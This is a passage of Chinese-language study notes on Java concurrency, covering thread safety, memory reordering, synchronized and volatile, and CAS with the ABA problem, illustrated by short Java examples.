<h5 id="饥饿-starvation"><a href="#饥饿-starvation" class="headerlink" title="饥饿(starvation)"></a>饥饿(starvation)</h5><p>资源总是被别的线程抢走了</p>
<h4 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h4><h4 id="可靠性"><a href="#可靠性" class="headerlink" title="可靠性"></a>可靠性</h4><p>可能会由一个线程导致JVM意外终止,其他的线程也无法执行</p>
<h2 id="2-线程安全问题"><a href="#2-线程安全问题" class="headerlink" title="2.线程安全问题"></a>2.线程安全问题</h2><p>线程安全主要表现为三个方面:原子性,可见性和有序性</p>
<h4 id="原子性-Atomic"><a href="#原子性-Atomic" class="headerlink" title="原子性(Atomic)"></a>原子性(Atomic)</h4><p>就是不可分割的意思,原子操作的不可分割有两层含义:</p>
<ul>
<li>访问(读,写)某个共享变量的操作从其他线程来看,这个操作要么已经执行完毕,要么尚未发生,其他线程看不到当前这个操作的中间结果</li>
<li>访问同一组共享变量的原子操作时不能够交叉的</li>
</ul>
<p>java有两种方式实现原子性:一种是使用锁,另一种是利用处理器的CAS指令</p>
<ul>
<li><p>锁具有排他性,保证共享变量在某一时刻只能被一个线程访问</p>
</li>
<li><p>CAS指令直接在硬件(处理器和内存)层次上实现,看做是硬件锁</p>
</li>
</ul>
<h4 id="可见性-visibility"><a href="#可见性-visibility" class="headerlink" title="可见性(visibility)"></a>可见性(visibility)</h4><p>在多线程环境中,一个线程对某个共享变量进行更新之后,后续其他的线程可能无法立即读取到这个更新的结果,这就是线程安全问题的另外一种形式</p>
<p>如果一个线程对共享变量更新后,后序访问该变量的其他线程可以读取到更新的结果,称这个线程对共享变量的更新对其他线程可见,否则称这个线程对共享变量的更新对其他线程不可见</p>
<h4 id="有序性-Ordering"><a href="#有序性-Ordering" class="headerlink" title="有序性(Ordering)"></a>有序性(Ordering)</h4><p>有序性是指在什么情况下一个处理器上运行的一个线程所执行的,内存访问操作在另外一个处理器运行的其他线程看起来是乱序的</p>
<p>乱序是指内存访问操作的顺序看起来发生了变化</p>
<h5 id="重排序"><a href="#重排序" class="headerlink" title="重排序"></a>重排序</h5><p>在多核处理器的环境下,编写的顺序结构,这种操作执行的顺序可能是没有保障的:</p>
<p>编译器可能会改变两个操作的先后顺序</p>
<p>处理器也可能不会按照目标代码的顺序执行</p>
<p>这种一个处理器上执行的多个操作,在其他处理器看来它的顺序与目标代码指定的顺序可能不一样,这种现象称为重排序</p>
<p>重排序是对内存访问有序操作的一种优化,可以在不影响单线程顺序正确的情况下提升程序的性能,但是可能对多线程程序的正确性产生影响,即可能导致线程安全问题</p>
<h5 id="与内存操作顺序有关的几个概念"><a href="#与内存操作顺序有关的几个概念" class="headerlink" title="与内存操作顺序有关的几个概念"></a>与内存操作顺序有关的几个概念</h5><p>源代码顺序:源码中指定的内存访问顺序</p>
<p>程序顺序:处理器上运行的目标代码所指定的内存访问顺序</p>
<p>执行顺序:内存访问操作在处理器上的实际执行顺序</p>
<p>感知顺序:给定处理器所感知到的该处理器及其他处理器的内存访问操作的顺序</p>
<p>可以把重排序分为指令重排序与存储子系统重排序两种</p>
<ul>
<li>指令重排序</li>
</ul>
<p>在源码顺序与程序顺序不一致,或者程序顺序与执行顺序不一致的情况下,我们就说发生了指令重排序</p>
<p>指令重拍是一种动作,确实对指令的顺序做了调整,重排序的对象是指令</p>
<p>javac编译器一般不会执行指令重排序,而jit编译器可能执行指令重排序</p>
<p>处理器也可能执行指令重排序,使得执行顺序与程序顺序不一致</p>
<p>指令重排序不会对单线程程序的结果产生影响,可能导致多线程程序出现非预期的结果</p>
<ul>
<li>存储子系统重排序</li>
</ul>
<p>存储子系统是指写缓冲器与高速缓存</p>
<p>高速缓存是CPU中为了匹配与主内存处理速度不匹配而设计的一个高速缓存,写缓冲器用来提高写告诉缓存操作的效率</p>
<p>即使处理器严格按照程序顺序执行两个内存访问操作,在存储子系统的作用下,其他处理器对这两个操作的感知顺序也可能与程序顺序不一致,即这两个操作的顺序看起来像是发生了变化,这种现象称为存储子系统重排序</p>
<p>存储子系统重排序对象是内存操作的结果</p>
<p>内存重排序分类</p>
<p>从处理器角度来看,读内存就是从指定的RAM地址中加载数据到寄存器,称为Load操作;写内存就是把数据存储到指定的地址表示的RAM存储单元中,称为Store操作,内存重排序有以下四种可能</p>
<p>LoadLoad重排序,一个处理器先后执行两个读操作L1和L2,其他处理器对两个内存操作的感知顺序可能是L2,L1</p>
<p>StoreStore重排序,一个处理器先后执行两个读操作W1和W2,其他处理器对两个内存操作的感知顺序可能是W2,W1</p>
<p>同理还有两种</p>
<p>LoadStore和StoreLoad重排序</p>
<h5 id="貌似串行语义"><a href="#貌似串行语义" class="headerlink" title="貌似串行语义"></a>貌似串行语义</h5><p>JIT编译器,处理器,存储子系统是按照一定的规则对指令内存操作的结果进行重排序,给单线程程序造成一种假象—指令是按照源码的顺序执行的,这种假象称为貌似串行语义</p>
<p>并不能保证多线程环境下程序的正确性</p>
<p>为了保证貌似串行语义,有数据依赖关系的语句不会被重排序,只有不存在数据依赖关系的语句才会被重排序</p>
<p>存在控制依赖关系的语句允许重拍,一条语句(指令)的执行结果会决定另一条语句(指令)能否被执行,这两条语句(指令)存在控制依赖关系,如在if语句中允许重排,可能存在处理器先执行if代码块,再判断If条件是否成立</p>
<h5 id="保证内存访问的顺序性"><a href="#保证内存访问的顺序性" class="headerlink" title="保证内存访问的顺序性"></a>保证内存访问的顺序性</h5><p>可以使用volatile关键字,synchronized关键字实现有序性</p>
<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>1.每个线程都有独立的栈空间</p>
<p>2.每个线程都可以访问堆内存</p>
<p>3.计算机的cpu不直接从内存读取数据,读的是从主存映射到cache的数据</p>
<p>4.jvm中的共享的数据可能会被分配到Register寄存器中,每个cpu都有自己的register寄存器,一个cpu不能读取其他cpu寄存器中的内容,如果两个线程分别运行在不同的处理器上</p>
<p>5.即使jvm中的共享数据分配到主内存中,也不能保证数据的可见性,cpu不直接对主内存访问,而是通过cache高速缓存进行的,一个处理器上运行的线程对数据的更新可能只是更新到处理器的写缓冲器中,还没有到达cache缓存,更不用说主内存了,另外一个处理器不能读取到该处理器写缓冲器上的内容,会产生运行在另外一个处理器上的线程无法看到该处理器对共享数据的更新</p>
<p>6.一个处理器的cache不能直接读取另外一个处理器的cache,但是一个处理器可以通过缓存一致性协议(Cache Coherence Protocol)来读取其他处理器缓存中的数据,并将读取到的数据更新到该处理器的cache中,这个过程称为缓存同步,缓存同步使得一个处理器上运行的线程可以读取到另外一个处理器上运行的线程对共享数据的所做的更新,即保障了可见性</p>
<p><strong>为了保障可见性,必须使一个处理器对共享数据的更新最终被写入该处理器的cache中,这个过程称为冲刷处理器缓存</strong></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220805225223525.png" alt="image-20220805225223525"></p>
<h2 id="3-线程同步"><a href="#3-线程同步" class="headerlink" title="3.线程同步"></a>3.线程同步</h2><h3 id="锁概述"><a href="#锁概述" class="headerlink" title="锁概述"></a>锁概述</h3><p>将多个线程对共享数据的并发访问转换为串行访问,即一个共享数据一次只能被一个线程访问</p>
<p>锁可以理解为对共享数据进行保护的一个许可证,对于同一个许可证保护的共享数据来说,任何相乘想要访问这些共享数据必须先持有该许可证,一个线程只有在持有许可证的情况下才能对这些共享数据进行访问,并且一个许可证一次只能被衣蛾线程持有,许可证线程在结束对共享数据的访问后必须释放其持有的许可证</p>
<p>一个线程在访问共享数据前必须先获得锁,获得锁的线程称为锁的持有线程,一个锁一次只能被一个线程持有.锁的持有线程在获得锁之后和释放锁之前这段时间锁执行的代码称为临界区(Critical Section)</p>
<p>锁具有排他性,即一个锁一次只能被一个线程持有,这种锁称为排它锁或互斥锁</p>
<p>jvm把锁分为内部锁和显示锁两种,内部锁通过synchronized关键字实现;显示锁通过Lock接口的实现类来实现</p>
<p>锁能够保障有序性,写线程在临界区所执行的在读线程所执行的临界区看来像是完全按照源码顺序执行的</p>
<p>注意:</p>
<p>使用锁保障线程的安全性,必须满足以下条件:</p>
<p><strong>这些线程在访问共享数据时必须使用同一个锁</strong></p>
<p><strong>即使是读取共享数据的线程也需要使用同步锁</strong></p>
<p><strong>锁的获得隐含着刷新处理器缓存的动作,释放锁隐含着处理器缓存冲刷的动作</strong>(拿进来改完再扔回去)</p>
<ul>
<li><strong>冲刷处理器缓存</strong>:当一个处理器对共享变量进行更新后,必须让它的更新最终被写入到高速缓冲或者主内存中.</li>
<li><strong>刷新处理器缓存</strong>:当处理器操作一个共享变量的时候,其它处理器在此之前已经对这个共享变量进行了更新,那么必须要对高速缓存或者主内存进行缓存同步.</li>
</ul>
<h4 id="锁相关的概念"><a href="#锁相关的概念" class="headerlink" title="锁相关的概念"></a>锁相关的概念</h4><h5 id="可重入性"><a href="#可重入性" class="headerlink" title="可重入性"></a>可重入性</h5><p>描述这样一个问题:一个线程持有该锁的时候能再次申请该锁</p>
<p>如果一个线程持有一个锁的时候还能够继续成功申请该锁,称该锁是可重入的,否则就称该锁为不可重入的</p>
<h5 id="锁的争用与调度"><a href="#锁的争用与调度" class="headerlink" title="锁的争用与调度"></a>锁的争用与调度</h5><p>java平台中内部锁属于非公平锁,显示Lock锁既支持公平锁又支持非公平锁</p>
<h5 id="锁的粒度"><a href="#锁的粒度" class="headerlink" title="锁的粒度"></a>锁的粒度</h5><p>一个锁可以保护的共享数据的数量大小称为锁的粒度</p>
<p>锁保护共享数据量大,称该锁的粒度粗,否则就称该锁的粒度细</p>
<p>锁的粒度过粗会导致线程在申请锁时会进行不必要的等待,锁的粒度过细会增加锁调度的开销</p>
<h5 id="内部锁synchronized关键字"><a href="#内部锁synchronized关键字" class="headerlink" title="内部锁synchronized关键字"></a>内部锁synchronized关键字</h5><p>java中的每个对象都有一个与之关联的内部锁,这种锁也称为监视器,这种内部锁是一种排他锁,可以保障原子性,可见性与有序性</p>
<p>内部锁是通过synchronized关键字实现的,synchronized关键字可以修饰代码块,修饰方法</p>
<p>修饰代码块的语法:</p>
<p>synchronized(锁对象,一般用this){</p>
<p>同步代码块,可以在同步代码块中访问共享数据</p>
<p>}</p>
<p>synchronized修饰实例对象,默认<strong>this</strong>作为锁对象</p>
<p>synchronized修饰静态方法,默认<strong>运行时类</strong>作为锁对象</p>
<p><strong>同步方法锁的粒度粗,同步代码块锁的粒度细</strong></p>
<h4 id="脏读"><a href="#脏读" class="headerlink" title="脏读"></a>脏读</h4><p>不仅对修改数据的代码块进行同步,还要对读取数据的代码块进行同步</p>
<p>如果不这样操作,可能会出现脏读的问题</p>
<h4 id="线程出现异常"><a href="#线程出现异常" class="headerlink" title="线程出现异常"></a>线程出现异常</h4><p>线程出现异常会自动释放锁</p>
<h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><p>如何避免死锁?</p>
<p>所有线程获得锁的顺序保持一致即可</p>
<h3 id="轻量级同步机制-volatile关键字"><a href="#轻量级同步机制-volatile关键字" class="headerlink" title="轻量级同步机制:volatile关键字"></a>轻量级同步机制:volatile关键字</h3><p>volatile关键字可以强制线程从公共内存中读取变量的值,而不是从工作内存中读取</p>
<h5 id="volatile与synchronized关键字比较"><a href="#volatile与synchronized关键字比较" class="headerlink" title="volatile与synchronized关键字比较"></a>volatile与synchronized关键字比较</h5><p>1.volatile关键字是线程同步的轻量级实现,所以volatile性能肯定比synchronized要好,volatile只能修饰变量,而synchronized可以修饰方法,代码块,随着jdk新版本的发布,synchronized的执行效率也就较大的提升,在开发中使用synchronized的比率还是很大的</p>
<p>2.多线程访问volatile变量不会发生阻塞,而synchronized可能会阻塞</p>
<p>3.volatile能保证数据的可见性,但是不能保证原子性,而synchronized既可以保证原子性,也可以保证可见性</p>
<p>4.关键字volatile解决的是变量在多个线程之间的可见性,  synchronized解决的是多个线程之间访问公共资源的同步性</p>
<h5 id="volatile不能保证原子性的例子"><a href="#volatile不能保证原子性的例子" class="headerlink" title="volatile不能保证原子性的例子"></a>volatile不能保证原子性的例子</h5><p>是直接公共内存拿过来的,说不定其他线程对其的操作还未结束,拿到的是中间值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        <span class="keyword">volatile</span>  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> num;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;num===&quot;</span>+num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            add();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220812155935083.png" alt="image-20220812155935083" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">///改为synchronized即可保证原子性</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> num;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;num===&quot;</span>+num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            add();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220812160208655.png" alt="image-20220812160208655" style="zoom:67%;" />

<h3 id="CAS-Compare-And-Swap-原理"><a href="#CAS-Compare-And-Swap-原理" class="headerlink" title="CAS(Compare And Swap)原理"></a>CAS(Compare And Swap)原理</h3><p>是由硬件实现的</p>
<p>CAS可以将read-modify-write这类的操作转换为原子操作</p>
<p>i++自增包括三个子操作</p>
<ul>
<li>从主内存读取i变量值</li>
<li>对i的值加1</li>
<li>再把加1后的值保存到主内存</li>
</ul>
<p>CAS原理:在把数据更新到主内存时,再次读取主内存变量的值,如果现在变量的值与期望的值(操作起始时读取的值)一样就更新</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220812164219675.png" alt="image-20220812164219675"></p>
<p>使用代码模拟CAS算法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">casTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> CASCounter casCounter=<span class="keyword">new</span> CASCounter();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; System.out.println(casCounter.incrementAndGet())).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CASCounter</span></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">private</span> <span class="keyword">long</span> value;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义一个Compare and swap方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">cas</span><span class="params">(<span class="keyword">long</span> expectedValue,<span class="keyword">long</span> newValue)</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(value==expectedValue)&#123;</span><br><span class="line">                value=newValue;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">incrementAndGet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> oldValue;</span><br><span class="line">        <span class="keyword">long</span> newValue;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            oldValue=value;</span><br><span class="line">            newValue=oldValue+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//cas() return false之后撤销本次递增,再增加一次</span></span><br><span class="line">        &#125;<span class="keyword">while</span> (!cas(oldValue,newValue));</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CAS实现原子操作背后有一个假设:共享变量的当前值与当前线程提供的期望值相同,就认为这个变量没有被其他线程修改过</p>
<p>实际上这种假设不一定总是成立,如有共享变量count=0</p>
<p>A线程将count修改为10,B线程将count修改为20,C线程将count值修改为0</p>
<p>当前线程看到count的值为0,<strong>不能简单的认为count的值没有被其他线程更新</strong></p>
<p>这就是CAS中的ABA问题,即共享变量经历了A-&gt;B-&gt;A,是否能够接受ABA问题跟实现的算法有关,如果想要规避ABA问题,可以为共享变量引入一个修订号(时间戳),每次修改共享变量时,相应的修订号发生变化AtmicStampedReference类就是基于这种思想产生的</p>
<h4 id="原子变量类概述"><a href="#原子变量类概述" class="headerlink" title="原子变量类概述"></a>原子变量类概述</h4><p>原子变量类基于CAS实现,其内部就是借助一个volatile变量</p>
<table>
<thead>
<tr>
<th>分组</th>
<th>原子变量类</th>
</tr>
</thead>
<tbody><tr>
<td>基础数据型</td>
<td>AtomicInteger,AtomicLong,AtomicBoolean</td>
</tr>
<tr>
<td>数组型</td>
<td>AtomicArray,AtomicLongArray,AtomicReferenceArray</td>
</tr>
<tr>
<td>字段更新器</td>
<td>AtomicIntegerFieldUpdater,AtomicLongFieldUpdater,AtomicReferenceFieldUpdater</td>
</tr>
<tr>
<td>引用型</td>
<td>AtomicReference,AtomicStampedReference,AtomicMarkableReference</td>
</tr>
</tbody></table>
<h5 id="AtomicIntegerFieldUpdater"><a href="#AtomicIntegerFieldUpdater" class="headerlink" title="AtomicIntegerFieldUpdater"></a>AtomicIntegerFieldUpdater</h5><p>AtomicIntegerFieldUpdater可以对原子整数字段进行更新,要求:</p>
<p>1.字符必须使用volatile修饰,使线程之间可见</p>
<p>2.只能是实例变量,不能是静态变量,也不能使用final修饰</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> SubThread(user).start();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">    <span class="keyword">private</span> AtomicIntegerFieldUpdater&lt;User&gt; updater=AtomicIntegerFieldUpdater.newUpdater(User.class,<span class="string">&quot;age&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SubThread</span><span class="params">(User user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">            System.out.println(updater.getAndIncrement(user));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> id, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似的几种也是这样的使用方式</p>
<h5 id="AtomicReference可能会出现CAS的ABA问题"><a href="#AtomicReference可能会出现CAS的ABA问题" class="headerlink" title="AtomicReference可能会出现CAS的ABA问题"></a>AtomicReference可能会出现CAS的ABA问题</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AtomicReference&lt;String&gt; atomicReference=<span class="keyword">new</span> AtomicReference&lt;&gt;(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread t1=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                atomicReference.compareAndSet(<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;def&quot;</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---&quot;</span>+atomicReference.get());</span><br><span class="line">                atomicReference.compareAndSet(<span class="string">&quot;def&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(atomicReference.compareAndSet(<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(atomicReference.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220812224758071.png" alt="image-20220812224758071"></p>
<h5 id="使用AtomicStampReference中的版本号来解决ABA问题"><a href="#使用AtomicStampReference中的版本号来解决ABA问题" class="headerlink" title="使用AtomicStampReference中的版本号来解决ABA问题"></a>使用AtomicStampReference中的版本号来解决ABA问题</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AtomicStampedReference&lt;String&gt; stampedReference=<span class="keyword">new</span> AtomicStampedReference&lt;&gt;(<span class="string">&quot;abc&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Thread t1=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                stampedReference.compareAndSet(<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;def&quot;</span>,stampedReference.getStamp(),stampedReference.getStamp()+<span class="number">1</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;----&quot;</span>+stampedReference.getReference());</span><br><span class="line">                stampedReference.compareAndSet(<span class="string">&quot;def&quot;</span>,<span class="string">&quot;abc&quot;</span>,stampedReference.getStamp(),stampedReference.getStamp()+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> stamp=stampedReference.getStamp();</span><br><span class="line">                <span class="comment">//先获得了版本号,但是sleep期间上面的线程导致版本号+1了</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//此处版本号不一致,所以并没有做出修改</span></span><br><span class="line">                System.out.println(stampedReference.compareAndSet(<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;hello&quot;</span>,stamp,stamp+<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(stampedReference.getReference());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 